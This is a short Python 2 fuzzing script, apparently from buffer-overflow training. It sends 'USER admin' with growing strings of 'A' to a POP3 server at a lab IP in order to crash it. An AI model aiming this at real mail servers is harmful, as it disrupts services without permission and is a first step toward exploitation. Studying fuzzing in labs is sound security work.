#!/usr/bin/python

import sys, socket

#Fuzzing Variables
server = '192.168.253.129'
port = 110
buffer = ["A"]
counter = 100

#The "<= 100" below is essentially the buffer+counter * 100 it will send 10,000 bytes ["<= 20" would send 2000 bytes] 
while len(buffer)<= 100:
	buffer.append("A"*counter)
	counter=counter+100

#While Accessible
try:
	for string in buffer:

		#Command variables for command
		command = "USER admin"
		
		#Printing current byte count, connecting to server, and grabbing banner
		print '[+] Sending %s bytes...' % len(string)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((server,port))
		s.recv(1024)
		
		#Sending command plus buffer to server
		s.send(command + string + '\r\n')
		s.recv(1024)
		print '[+] Done'

#When Unreachable
except:
 	print '[!] Unable to connect to the application. You may have crashed it.'
 	sys.exit(0)

#Close the socket
finally:
	s.close()
